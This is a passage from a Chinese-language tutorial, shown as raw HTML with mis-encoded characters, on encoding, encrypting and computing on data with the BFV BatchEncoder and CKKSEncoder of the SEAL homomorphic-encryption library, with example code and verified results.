punctuation">(</span>pod_matrix<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>encode</strong></p><p>ä»ç»™å®šçš„çŸ©é˜µåˆ›å»ºä¸€ä¸ªæ˜æ–‡,&quot;æ‰¹é‡å¤„ç†&quot;ä¸€ä¸ªç»™å®šçš„çŸ©é˜µ Mod (plaintext modulus) ç„¶åå°†ç»“æœå­˜å‚¨åˆ°<br>plaintextç±»ï¼Œè¾“å…¥çš„vecotrçš„å¤§å° &lt;= å¤šé¡¹å¼æ¨¡çš„æ¬¡æ•°(poly_modulus_degree)</p><pre class="language-c" data-language="c"><code class="language-c">batch_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> plain_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="ç®€å•æ ·ä¾‹éªŒè¯">ç®€å•æ ·ä¾‹éªŒè¯</h3><p>ç”ŸæˆçŸ©é˜µAå’ŒçŸ©é˜µB</p><pre class="language-c" data-language="c"><code class="language-c">çŸ©é˜µAå½¢å¼<span class="token operator">:</span><span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">]</span>çŸ©é˜µBå½¢å¼ï¼š<span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span>æ±‚  <span class="token punctuation">(</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">2</span> å¹¶éªŒè¯ç»“æœ</code></pre><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c">vector<span class="token operator">&lt;</span><span class="token class-name">uint64_t</span><span class="token operator">></span> <span class="token function">pod_matrix</span><span class="token punctuation">(</span>slot_count<span class="token punctuation">,</span> <span class="token number">0ULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// </span>   pod_matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0ULL</span><span class="token punctuation">;</span>   pod_matrix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1ULL</span><span class="token punctuation">;</span>   pod_matrix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2ULL</span><span class="token punctuation">;</span>   pod_matrix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3ULL</span><span class="token punctuation">;</span>   pod_matrix<span class="token punctuation">[</span>row_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4ULL</span><span class="token punctuation">;</span>   pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5ULL</span><span class="token punctuation">;</span>   pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6ULL</span><span class="token punctuation">;</span>   pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7ULL</span><span class="token punctuation">;</span>   <span class="token comment">/*   é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨BatchEncoderå°†çŸ©é˜µç¼–ç æˆä¸€ä¸ªæ˜æ–‡å¤šé¡¹å¼ã€‚   */</span>   Plaintext plain_matrix<span class="token punctuation">;</span>   <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encode plaintext matrix:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   <span class="token comment">/*    ä»ç»™å®šçš„çŸ©é˜µåˆ›å»ºä¸€ä¸ªæ˜æ–‡,"æ‰¹é‡å¤„ç†"ä¸€ä¸ªç»™å®šçš„çŸ©é˜µ Mod (plaintext modulus) ç„¶åå°†ç»“æœå­˜å‚¨åˆ°    plaintextç±»ï¼Œè¾“å…¥çš„vecotrçš„å¤§å° &lt;= å¤šé¡¹å¼æ¨¡çš„æ¬¡æ•°(poly_modulus_degree)   */</span>   batch_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> plain_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/*   æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åŠ å¯†å·²ç¼–ç çš„æ˜æ–‡ã€‚   */</span>   Ciphertext encrypted_matrix<span class="token punctuation">;</span>   <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encrypt plain_matrix to encrypted_matrix."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain_matrix<span class="token punctuation">,</span> encrypted_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget in encrypted_matrix: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>       <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   <span class="token comment">/*   * å¯¹å¯†æ–‡çš„æ“ä½œå¯¼è‡´åœ¨æ‰€æœ‰8192(poly_modulus_degree)ä¸ªslot(çŸ©é˜µå…ƒç´ )ä¸­åŒæ—¶æ‰§è¡ŒåŒæ€æ“ä½œã€‚ä¸ºäº†è¯´æ˜è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ„é€ äº†å¦ä¸€ä¸ªæ˜æ–‡çŸ©é˜µï¼š        [ 1,  2,  1,  2,  1,  2, ..., 2 ]        [ 1,  2,  1,  2,  1,  2, ..., 2 ]    ç„¶åæŠŠå®ƒç¼–ç æˆæ˜æ–‡ã€‚    */</span>   vector<span class="token operator">&lt;</span><span class="token class-name">uint64_t</span><span class="token operator">></span> pod_matrix2<span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> slot_count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       pod_matrix2<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token class-name">size_t</span><span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   Plaintext plain_matrix2<span class="token punctuation">;</span>   batch_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>pod_matrix2<span class="token punctuation">,</span> plain_matrix2<span class="token punctuation">)</span><span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Second input plaintext matrix:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix2<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/*    ç°åœ¨æˆ‘ä»¬å°†ç¬¬äºŒä¸ª(æ˜æ–‡)çŸ©é˜µæ·»åŠ åˆ°åŠ å¯†çŸ©é˜µä¸­ï¼Œå¹¶æ±‚sum^2ã€‚    */</span>   <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Sum, square, and relinearize."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   evaluator<span class="token punctuation">.</span><span class="token function">add_plain_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_matrix2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// encrypted_matrix = ncrypted_matrix +ã€€plain_matrix2</span>   evaluator<span class="token punctuation">.</span><span class="token function">square_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// encrypted_matrix = encrypted_matrix * encrypted_matrix;</span>   evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åºåˆ—åŒ–</span>   <span class="token comment">/*   æŸ¥çœ‹å‰©ä½™å™ªéŸ³é¢„ç®—   */</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget in result: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   <span class="token comment">/*   æˆ‘ä»¬å°†åŠ å¯†çš„ æ•°æ®è¿›è¡Œè§£å¯†å¹¶è§£ç å¹¶éªŒè¯ç»“æœ   */</span>   Plaintext plain_result<span class="token punctuation">;</span>   <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Decrypt and decode result."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_result<span class="token punctuation">)</span><span class="token punctuation">;</span>   batch_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_result<span class="token punctuation">,</span> pod_result<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_result<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// éªŒè¯ç»“æœ</span></code></pre>              </div>            </details><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093931.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093931.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093930292"></p><h3 id="æ€»ç»“ï¼š">æ€»ç»“ï¼š</h3><p>å½“æ‰€éœ€çš„åŠ å¯†è®¡ç®—é«˜åº¦å¯å¹¶è¡ŒåŒ–æ—¶ï¼Œæ‰¹å¤„ç†å…è®¸æˆ‘ä»¬æœ‰æ•ˆåœ°ä½¿ç”¨å…¨æ˜æ–‡å¤šé¡¹å¼ã€‚ä½†æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰è§£å†³è¿™ä¸ªæ–‡ä»¶å¼€å¤´æåˆ°çš„å¦ä¸€ä¸ªé—®é¢˜:æ¯ä¸ªæ§½åªåŒ…å«ä¸€ä¸ªæ•´æ•°æ¨¡çš„æ˜æ–‡æ¨¡é‡ï¼Œé™¤éæ˜æ–‡æ¨¡é‡éå¸¸å¤§ï¼Œå¦åˆ™æˆ‘ä»¬å¯ä»¥å¾ˆå¿«é‡åˆ°æ•°æ®ç±»å‹æº¢å‡ºï¼Œå¹¶åœ¨éœ€è¦æ•´æ•°è®¡ç®—æ—¶ä¼šå¾—åˆ°æ„å¤–çš„ç»“æœã€‚æ³¨æ„ï¼Œæº¢å‡ºå¹¶ä¸èƒ½ä»¥åŠ å¯†çš„å½¢å¼æ£€æµ‹åˆ°ã€‚CKKSæ–¹æ¡ˆ(ä»¥åŠCKKSEncoder)è§£å†³äº†æ•°æ®ç±»å‹æº¢å‡ºé—®é¢˜ï¼Œä½†ä»£ä»·æ˜¯åªäº§ç”Ÿè¿‘ä¼¼çš„ç»“æœã€‚</p></div><h2 id="CKKSEncoder">CKKSEncoder</h2><div class="story post-story"><p>[CKKSEncoder] (For CKKS scheme only)<br>å®æ•°æˆ–å¤æ•°å½¢å¼</p><blockquote><p>(1) CKKSä¸ä½¿ç”¨plain_modulusåŠ å¯†å‚æ•°;</p><p>(2) å½“ä½¿ç”¨CKKSæ–¹æ¡ˆæ—¶,é€‰æ‹©coeff_modulusæ˜¯éå¸¸é‡è¦çš„</p></blockquote><p>å£°æ˜æ–¹å¼ åŒbfvä¸€è‡´ï¼Œ</p><pre class="language-c" data-language="c"><code class="language-c">EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>ckks<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ä½¿ç”¨ckks</span><span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">8192</span><span class="token punctuation">;</span>parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span>parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">Create</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// äº§ç”Ÿ5ä¸ª40ä½çš„ç´ æ•°çš„æ•°ç»„</span></code></pre><p>CKKS ä¸­ slotæ•°ç›®  =  poly_modulus_degree / 2  æ¯ä¸ªslotç¼–ç ä¸ºä¸€ä¸ªå®æ•°æˆ–å¤æ•°ã€‚</p><p>è€Œåœ¨BFVä¸­ slot = poly_modulus_degree å¹¶ä¸”è¢«å¤„ç†æˆ ä¸€ä¸ª2X(N/2)çš„çŸ©é˜µ</p><pre class="language-c++" data-language="c++"><code class="language-c++">size_t slot_count &#x3D; encoder.slot_count();</code></pre><p>è¦åˆ›å»ºCKKSçº¯æ–‡æœ¬ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„ç¼–ç å™¨:</p><p>BatchEncoderä¸é€‚ç”¨äºCKKS<br>CKKSEncoder çš„æ–¹å¼æ˜¯å°†å®æ•°æˆ–å¤æ•°çš„å‘é‡ç¼–ç ä¸ºPlaintext objects ç„¶åå¯¹objectå°±å¯ä»¥åŠ å¯†äº†</p><table><thead><tr><th>å‡½æ•°è°ƒç”¨</th><th>å‚æ•°ç±»å‹</th><th>è§£é‡Šè¯´æ˜</th></tr></thead><tbody><tr><td>CKKSEncoder encoder(context);</td><td>SEALContext</td><td>å£°æ˜ä¸€ä¸ªCKKSç¼–ç å™¨</td></tr><tr><td>encoder.encode(input, scale, plain);</td><td>Vector,scale,Plaintext</td><td>å°†vector æŒ‰ç…§scaleå®šä¹‰çš„ç¼–ç ç²¾åº¦çš„å°ºåº¦å‚æ•° ç¼–ç æˆ Plaintext</td></tr><tr><td>encoder.decode(plain, output);</td><td>Plaintextï¼ŒVector</td><td>å°†æ˜æ–‡Plaintextè§£å¯†æˆVector</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="ç¼–ç ä¸è§£ç ">ç¼–ç ä¸è§£ç </h3><pre class="language-c" data-language="c"><code class="language-c">Plaintext plain<span class="token punctuation">;</span><span class="token keyword">double</span> scale <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encode input vector. and the size of scale: "</span><span class="token operator">&lt;&lt;</span> scale <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> scale<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å°†vector æŒ‰ç…§scaleå®šä¹‰çš„ç¼–ç ç²¾åº¦çš„å°ºåº¦å‚æ•° ç¼–ç æˆ Plaintext</span><span class="token comment">/* æˆ‘ä»¬å¯ä»¥ç«‹å³è§£ç ä»¥æ£€æŸ¥ç¼–ç çš„æ­£ç¡®æ€§ã€‚*/</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> output<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decode input vector ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è§£ç </span><span class="token function">print_vector</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093958.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093958.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093957617"></p><p>åšä¸ªç®€å•æ ·ä¾‹éªŒè¯ï¼Œã€€å°†è¾“å…¥çš„vectoråŠ å¯†å æ±‚å¹³æ–¹ã€€å¹¶ã€€åºåˆ—åŒ–åã€€è§£ç éªŒè¯ç»“æœ</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*    The vector is encrypted the same was as in BFV.    ç®€å•æ ·ä¾‹:        å°†è¾“å…¥çš„ vector åŠ å¯†å æ±‚å¹³æ–¹ å¹¶ åºåˆ—åŒ–    */</span>    Ciphertext encrypted<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encrypt input vector, square, and relinearize."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åŠ å¯† Plaintext -> Ciphertext</span>    <span class="token comment">// è®¡ç®—</span>    evaluator<span class="token punctuation">.</span><span class="token function">square_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// encrypted = encrypted * encrypted</span>    evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åºåˆ—åŒ–</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Scale in squared input: "</span> <span class="token operator">&lt;&lt;</span> encrypted<span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" ("</span> <span class="token operator">&lt;&lt;</span> <span class="token function">log2</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits)"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Decrypt and decode."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è§£å¯†</span>    encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è§£ç </span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Result vector ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_vector</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ç»“æœ</span></code></pre>              </div>            </details><p>éªŒè¯ç»“æœæ­£ç¡®</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812094017.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812094017.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812094016156"></p></div><h2 id="å…¨éƒ¨æºä»£ç ">å…¨éƒ¨æºä»£ç </h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"examples.h"</span></span>using namespace std<span class="token punctuation">;</span>using namespace seal<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">example_batch_encoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">print_example_banner</span><span class="token punctuation">(</span><span class="token string">"Example: Encoders / Batch Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">/*    [BatchEncoder] (For BFV scheme only)    Let N è¡¨ç¤º poly_modulus_degree ; T è¡¨ç¤º plain_modulus. Batching    allows the BFV plaintext polynomials to be viewed as 2-by-(N/2) matrices, with    each element an integer modulo T. åœ¨çŸ©é˜µè§†å›¾ä¸­ï¼ŒåŠ å¯†æ“ä½œæ³•æ¡ˆåœ¨åŠ å¯†çš„çŸ©é˜µä¸Š,    allowing the user to obtain speeds-ups of several orders of magnitude in fully vectorizable computations.     Thus, in all but the simplest computations, batching should be the preferred method to use    with BFV, and when used properly will result in implementations outperforming    anything done without batching.    */</span>    EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>bfv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">8192</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">BFVDefault</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_plain_modulus</span><span class="token punctuation">(</span>PlainModulus<span class="token operator">::</span><span class="token function">Batching</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//PlainModulus::Batching(poly_modulus_degree, 20) äº§ç”Ÿ20ä½çš„ç´ æ•°</span>    SEALContext <span class="token function">context</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_parameters</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">// æ£€æµ‹æ˜¯å¦æˆåŠŸå¯ç”¨</span>    <span class="token keyword">auto</span> qualifiers <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">first_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">qualifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Batching enabled: "</span> <span class="token operator">&lt;&lt;</span> boolalpha <span class="token operator">&lt;&lt;</span> qualifiers<span class="token punctuation">.</span>using_batching <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    KeyGenerator <span class="token function">keygen</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey secret_key <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">secret_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    PublicKey public_key<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_public_key</span><span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    RelinKeys relin_keys<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_relin_keys</span><span class="token punctuation">(</span>relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    Encryptor <span class="token function">encryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    Evaluator <span class="token function">evaluator</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    Decryptor <span class="token function">decryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    BatchEncoder <span class="token function">batch_encoder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> slot_count <span class="token operator">=</span> batch_encoder<span class="token punctuation">.</span><span class="token function">slot_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> row_size <span class="token operator">=</span> slot_count <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Plaintext matrix slot_count size: "</span> <span class="token operator">&lt;&lt;</span> slot_count <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Plaintext matrix row size: "</span> <span class="token operator">&lt;&lt;</span> row_size <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * å£°æ˜ä¸€ä¸ªvectorï¼Œé•¿åº¦ä¸ºslot_countï¼Œ é»˜ä¸º 0     * å½¢å¼ä¸ºï¼š 2*(slot_count/2) çš„äºŒç»´çŸ©é˜µ    * [0...............row_size]    * [row_size......slot_count]    */</span>    vector<span class="token operator">&lt;</span><span class="token class-name">uint64_t</span><span class="token 